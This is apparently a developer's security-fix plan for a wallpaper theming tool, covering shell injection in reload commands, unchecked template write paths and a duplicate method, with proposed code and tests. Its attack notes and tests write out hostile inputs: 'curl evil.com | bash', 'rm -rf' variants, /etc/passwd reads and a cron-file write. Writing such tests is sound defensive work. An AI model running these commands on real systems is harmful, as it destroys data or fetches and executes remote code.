# Security Fixes Implementation Plan

**Date:** 2025-12-30
**Priority:** CRITICAL - Must complete before release
**Estimated Complexity:** Low-Medium

---

## Overview

Three immediate issues identified in the Phase 4 Final Review:

| ID | Issue | Severity | Location | Effort |
|----|-------|----------|----------|--------|
| SEC-001 | Shell injection in reload commands | CRITICAL | `theming.py:764` | Low |
| SEC-002 | Arbitrary file write via template targets | HIGH | `theming.py:533,541` | Medium |
| BUG-001 | Duplicate method definition | MEDIUM | `indexer.py:79,422` | Trivial |

---

## SEC-001: Shell Injection in Reload Commands

### Problem Analysis

**Vulnerable Code** (`theming.py:754-773`):
```python
def _run_reload_command(self, command: str, template_name: str) -> None:
    subprocess.run(
        command,
        shell=True,  # VULNERABILITY: Allows shell metacharacter injection
        timeout=self.RELOAD_TIMEOUT,
        ...
    )
```

**Attack Vector:**
1. User config at `~/.config/variety/smart_selection.json` contains `reload_commands` section
2. Line 657-660 allows override: `template.reload_command = reload_overrides[template.name]`
3. Attacker-crafted config: `{"reload_commands": {"kitty": "rm -rf ~ #"}}`
4. On wallpaper change, arbitrary command executes

**Real-world Risk:** Low (requires attacker to modify user's config file), but principle violation is serious.

### Solution

**Approach:** Use `shlex.split()` with `shell=False`, plus allowlist validation for known reload commands.

**Implementation:**

```python
import shlex

# Allowlist of known safe reload command patterns
SAFE_RELOAD_PATTERNS = {
    "hyprctl", "swaymsg", "i3-msg", "killall", "polybar-msg",
    "pkill", "kill", "systemctl", "dbus-send"
}

def _validate_reload_command(self, command: str) -> bool:
    """Validate reload command against allowlist.

    Returns True if command starts with a known safe executable.
    """
    try:
        parts = shlex.split(command)
        if not parts:
            return False
        executable = os.path.basename(parts[0])
        return executable in SAFE_RELOAD_PATTERNS
    except ValueError:
        return False

def _run_reload_command(self, command: str, template_name: str) -> None:
    """Run a reload command with timeout.

    Security: Uses shell=False and validates against allowlist.
    """
    if not self._validate_reload_command(command):
        logger.warning(
            f"Reload command blocked for {template_name}: "
            f"'{command}' not in allowlist"
        )
        return

    try:
        args = shlex.split(command)
        subprocess.run(
            args,
            shell=False,  # SECURE
            timeout=self.RELOAD_TIMEOUT,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        logger.debug(f"Reload command succeeded for {template_name}")
    except subprocess.TimeoutExpired:
        logger.warning(f"Reload command timed out for {template_name}: {command}")
    except FileNotFoundError:
        logger.warning(f"Reload command not found for {template_name}: {args[0]}")
    except Exception as e:
        logger.warning(f"Reload command failed for {template_name}: {e}")
```

### Test Requirements

```python
# tests/smart_selection/test_theming_security.py

class TestReloadCommandSecurity:
    """Security tests for reload command handling."""

    def test_valid_reload_commands_allowed(self, theming_engine):
        """Known safe commands should execute."""
        assert theming_engine._validate_reload_command("hyprctl reload")
        assert theming_engine._validate_reload_command("killall -SIGUSR2 waybar")
        assert theming_engine._validate_reload_command("i3-msg reload")

    def test_shell_injection_blocked(self, theming_engine):
        """Shell metacharacters should not execute."""
        # These should all be blocked
        assert not theming_engine._validate_reload_command("echo $(whoami)")
        assert not theming_engine._validate_reload_command("cat /etc/passwd; rm -rf /")
        assert not theming_engine._validate_reload_command("curl evil.com | bash")
        assert not theming_engine._validate_reload_command("rm -rf ~")

    def test_unknown_executable_blocked(self, theming_engine):
        """Unknown executables should be blocked."""
        assert not theming_engine._validate_reload_command("/tmp/malicious")
        assert not theming_engine._validate_reload_command("python -c 'import os; os.system(\"id\")'")

    def test_empty_command_blocked(self, theming_engine):
        """Empty or malformed commands should be blocked."""
        assert not theming_engine._validate_reload_command("")
        assert not theming_engine._validate_reload_command("   ")

    def test_shlex_parsing_edge_cases(self, theming_engine):
        """Malformed quoting should not crash."""
        # Unclosed quote - shlex.split raises ValueError
        assert not theming_engine._validate_reload_command("echo 'unclosed")
```

---

## SEC-002: Arbitrary File Write via Template Targets

### Problem Analysis

**Vulnerable Code** (`theming.py:532-533`):
```python
# Expand ~ in target path
target_path = os.path.expanduser(target_path)
# No validation - accepts any path
```

**Attack Vector:**
1. Malicious wallust.toml: `[templates]\nmalicious = { template = "x", target = "/etc/cron.d/pwned" }`
2. Template contains malicious cron job
3. On wallpaper change, cron job is written

**Real-world Risk:** Medium (requires root for system paths, but can overwrite user files).

### Solution

**Approach:** Validate target paths against allowed directories.

**Implementation:**

```python
# Allowed base directories for template output
ALLOWED_TARGET_DIRS = [
    os.path.expanduser("~/.config"),
    os.path.expanduser("~/.cache"),
    os.path.expanduser("~/.local"),
    "/tmp",
]

def _validate_target_path(self, target_path: str) -> bool:
    """Validate template target path is within allowed directories.

    Args:
        target_path: The expanded target path.

    Returns:
        True if path is within allowed directories.
    """
    # Resolve to absolute path, following symlinks
    try:
        resolved = os.path.realpath(target_path)
    except (OSError, ValueError):
        return False

    # Check for path traversal
    if ".." in target_path:
        logger.warning(f"Path traversal detected in target: {target_path}")
        return False

    # Must be under an allowed directory
    for allowed_dir in ALLOWED_TARGET_DIRS:
        allowed_resolved = os.path.realpath(allowed_dir)
        if resolved.startswith(allowed_resolved + os.sep) or resolved == allowed_resolved:
            return True

    return False
```

**Integration** (in `_load_wallust_templates`, after line 533):
```python
target_path = os.path.expanduser(target_path)

# Validate target path is in allowed directory
if not self._validate_target_path(target_path):
    logger.warning(
        f"Template {name} target path rejected: {target_path} "
        f"not in allowed directories"
    )
    continue
```

### Test Requirements

```python
class TestTargetPathSecurity:
    """Security tests for template target path validation."""

    def test_allowed_paths_accepted(self, theming_engine):
        """Paths in ~/.config, ~/.cache, ~/.local should be allowed."""
        assert theming_engine._validate_target_path(
            os.path.expanduser("~/.config/kitty/colors.conf")
        )
        assert theming_engine._validate_target_path(
            os.path.expanduser("~/.cache/variety/theme.json")
        )

    def test_system_paths_rejected(self, theming_engine):
        """System paths should be rejected."""
        assert not theming_engine._validate_target_path("/etc/cron.d/evil")
        assert not theming_engine._validate_target_path("/usr/bin/malicious")
        assert not theming_engine._validate_target_path("/root/.bashrc")

    def test_path_traversal_rejected(self, theming_engine):
        """Path traversal attempts should be rejected."""
        assert not theming_engine._validate_target_path(
            os.path.expanduser("~/.config/../../../etc/passwd")
        )
        assert not theming_engine._validate_target_path(
            "/tmp/../etc/shadow"
        )

    def test_symlink_resolution(self, theming_engine, tmp_path):
        """Symlinks should be resolved before validation."""
        # Create symlink from allowed to disallowed location
        allowed = tmp_path / "allowed"
        allowed.mkdir()
        evil_link = allowed / "evil"
        evil_link.symlink_to("/etc")

        # Even though path starts in allowed dir, resolved path is /etc
        # This should be rejected
        target = str(evil_link / "passwd")
        assert not theming_engine._validate_target_path(target)

    def test_home_directory_root_rejected(self, theming_engine):
        """Writing directly to ~ should be rejected (not in ~/.config etc)."""
        assert not theming_engine._validate_target_path(
            os.path.expanduser("~/.bashrc")
        )
        assert not theming_engine._validate_target_path(
            os.path.expanduser("~/.ssh/authorized_keys")
        )
```

---

## BUG-001: Duplicate Method Definition

### Problem Analysis

**Location:** `indexer.py` has `_is_image_file` defined twice:
- Line 79-89: Original definition
- Line 422-432: Duplicate definition

Both implementations are functionally identical. The second shadows the first, which is confusing and a maintenance hazard.

### Solution

**Approach:** Delete the duplicate at line 422-432.

**Verification:**
1. Confirm both implementations are identical
2. Remove duplicate
3. Run existing tests to confirm no breakage

### Test Requirements

No new tests needed - existing tests cover the functionality. Verify with:
```bash
pytest tests/smart_selection/test_indexer.py -v
```

---

## Implementation Checklist

### SEC-001: Shell Injection Fix
- [ ] Add `SAFE_RELOAD_PATTERNS` constant
- [ ] Implement `_validate_reload_command()` method
- [ ] Modify `_run_reload_command()` to use `shlex.split()` and `shell=False`
- [ ] Add `FileNotFoundError` handling
- [ ] Write `test_theming_security.py` with all test cases
- [ ] Run full test suite

### SEC-002: Path Validation Fix
- [ ] Add `ALLOWED_TARGET_DIRS` constant
- [ ] Implement `_validate_target_path()` method
- [ ] Integrate validation in `_load_wallust_templates()`
- [ ] Write path validation tests
- [ ] Test symlink edge case
- [ ] Run full test suite

### BUG-001: Duplicate Method
- [ ] Verify both implementations are identical
- [ ] Delete lines 422-432
- [ ] Run indexer tests
- [ ] Run full test suite

---

## Verification Plan

After all fixes:
```bash
# Run full test suite
pytest tests/smart_selection/ -v

# Run security-specific tests
pytest tests/smart_selection/test_theming_security.py -v

# Verify no regressions
pytest tests/ -v
```

---

## Commit Strategy

Three separate commits for clean history:

1. `fix(security): prevent shell injection in reload commands`
2. `fix(security): validate template target paths`
3. `fix(indexer): remove duplicate _is_image_file method`

Tag after all fixes: `smart-selection-v0.4.1-security`
